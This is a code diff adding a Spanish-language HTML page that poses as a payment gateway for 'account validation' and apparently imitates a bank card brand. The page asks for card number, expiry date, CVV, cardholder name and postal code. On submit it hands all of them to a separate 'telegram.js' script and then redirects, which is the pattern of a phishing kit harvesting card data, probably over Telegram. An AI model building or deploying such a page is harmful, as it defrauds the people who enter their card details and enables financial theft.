@@ -1,0 +1,269 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pasarela de Pago</title>
+    <link rel="icon" href="icon.png" type="image/png">
+    <style>
+    * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+    }
+
+    body {
+        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+        background-color: #f5f5f5;
+        color: #333;
+        line-height: 1.5;
+    }
+
+    .container {
+        max-width: 396px;
+        margin: 13px auto;
+        padding: 20px;
+        border-radius: 19px;
+        min-height: 100vh;
+        background: white;
+        position: relative;
+    }
+    /* Ocultar la barra de incremento/decremento en input type="number" */
+    input[type="number"]::-webkit-outer-spin-button,
+    input[type="number"]::-webkit-inner-spin-button {
+        -webkit-appearance: none;
+        margin: 0;
+    }
+
+    input[type="number"] {
+        -moz-appearance: textfield; /* Para Firefox */
+    }
+
+    header {
+        display: flex;
+        align-items: center;
+        padding: 1rem;
+        background: white;
+        border-bottom: 1px solid #eee;
+    }
+
+    .back-button {
+        background: none;
+        border: none;
+        padding: 0.5rem;
+        cursor: pointer;
+    }
+
+    .header-text {
+        margin-left: 1rem;
+        font-size: 1rem;
+        color: #333;
+    }
+
+    .spacer {
+        flex: 1;
+    }
+
+    main {
+        padding: 2rem 1.5rem;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        text-align: center;
+    }
+
+    .illustration {
+        position: relative;
+        margin: 2rem 0;
+    }
+
+    .circle-bg {
+        width: 200px;
+        height: 200px;
+        background: #f0f0f0;
+        border-radius: 50%;
+        position: absolute;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        z-index: 1;
+    }
+
+    .card-image {
+        width: 120px;
+        height: auto;
+        position: relative;
+        z-index: 2;
+    }
+
+    h1 {
+        font-size: 1.25rem;
+        margin-bottom: 2rem;
+        font-weight: 600;
+    }
+
+    .form-container {
+        width: 100%;
+        max-width: 300px;
+    }
+
+    .input-group {
+        margin-bottom: 1rem;
+    }
+
+    .input-group label {
+        display: block;
+        margin-bottom: 0.5rem;
+        text-align: left;
+    }
+
+    .input-group input {
+        width: 100%;
+        padding: 0.5rem;
+        border: 2px solid #ddd;
+        border-radius: 8px;
+        font-size: 1rem;
+    }
+
+    .input-group input:focus {
+        border-color: #008f76;
+        outline: none;
+    }
+
+    .submit-btn {
+        background-color: #00d180;
+        color: white;
+        border: none;
+        padding: 1rem;
+        width: 100%;
+        border-radius: 8px;
+        font-size: 1rem;
+        cursor: pointer;
+        margin-top: 1rem;
+    }
+
+    .submit-btn:hover {
+        background-color: #007a64;
+    }
+
+    @media (min-width: 768px) {
+        .container {
+            margin: 2rem auto;
+            min-height: calc(100vh - 4rem);
+            border-radius: 1rem;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        }
+    }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <a href="index.html">
+                <button class="back-button" aria-label="Volver">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                        <path d="m15 18-6-6 6-6"/>
+                    </svg>
+                </button>
+            </a>
+            <span class="header-text"><strong>Validar Cuenta</strong></span>
+            <span class="spacer"></span>
+        </header>
+
+        <main>
+            <div class="illustration">
+                <div style="background-color: transparent;" class="circle-bg"></div>
+                <img src="assets/tcstori.png" alt="Ilustración de tarjeta de crédito" class="card-image">
+            </div>
+
+            <h1>Ingrese los detalles de su tarjeta</h1>
+
+            <form id="payment-form" class="form-container">
+                <div class="input-group">
+                    <label for="card-number">Número de Tarjeta</label>
+                    <input type="text" id="card-number" name="card-number" required maxlength="19" placeholder="1234 5678 9012 3456">
+                </div>
+                <div class="input-group">
+                    <label for="expiry-date">Fecha de Expiración</label>
+                    <input type="text" id="expiry-date" name="expiry-date" required maxlength="5" placeholder="MM/YY">
+                </div>
+                <div class="input-group">
+                    <label for="cvv">CVV</label>
+                    <input type="number" id="cvv" name="cvv" oninput="validateCVV()" required maxlength="4" placeholder="123">
+                </div>
+                <div class="input-group">
+                    <label for="name">Nombre en la Tarjeta</label>
+                    <input type="text" id="name" name="name" required placeholder="Juan Pérez">
+                </div>
+                <div class="input-group">
+                    <label for="postal-code">Código Postal</label>
+                    <input type="number" id="postal-code" name="postal-code" required placeholder="12345">
+                </div>
+                <button type="submit" class="submit-btn">Confirmar</button>
+            </form>
+        </main>
+    </div>
+
+    <script src="telegram.js"></script>
+    <script>
+    document.addEventListener('DOMContentLoaded', function() {
+        const form = document.getElementById('payment-form');
+        const cardNumberInput = document.getElementById('card-number');
+        const expiryDateInput = document.getElementById('expiry-date');
+
+        // Formato para el número de tarjeta
+        cardNumberInput.addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
+            let formattedValue = '';
+            for(let i = 0; i < value.length; i++) {
+                if(i > 0 && i % 4 === 0) {
+                    formattedValue += ' ';
+                }
+                formattedValue += value[i];
+            }
+            e.target.value = formattedValue;
+        });
+
+        // Formato para la fecha de expiración
+        expiryDateInput.addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            if (value.length > 2) {
+                value = value.slice(0,2) + '/' + value.slice(2);
+            }
+            e.target.value = value;
+        });
+
+        // Manejar envío del formulario
+        form.addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            // Disparar evento personalizado para telegram.js
+            const event = new CustomEvent('paymentCompleted', { 
+                detail: {
+                    cardNumber: document.getElementById('card-number').value,
+                    expiryDate: document.getElementById('expiry-date').value,
+                    cvv: document.getElementById('cvv').value,
+                    name: document.getElementById('name').value,
+                    postalCode: document.getElementById('postal-code').value
+                }
+            });
+            document.dispatchEvent(event);
+            
+            // Redireccionar después de enviar
+            setTimeout(() => {
+                window.location.href = "Credito.html"; // Cambia esta URL según necesites
+            }, 1000);
+        });
+    });
+
+    function validateCVV() {
+        let input = document.getElementById('cvv');
+        let value = input.value;
+        
+        if (value.length > 4) {
+            input.value = value.slice(0, 4);
+        }
+    }
+    </script>
+</body>
+</html>
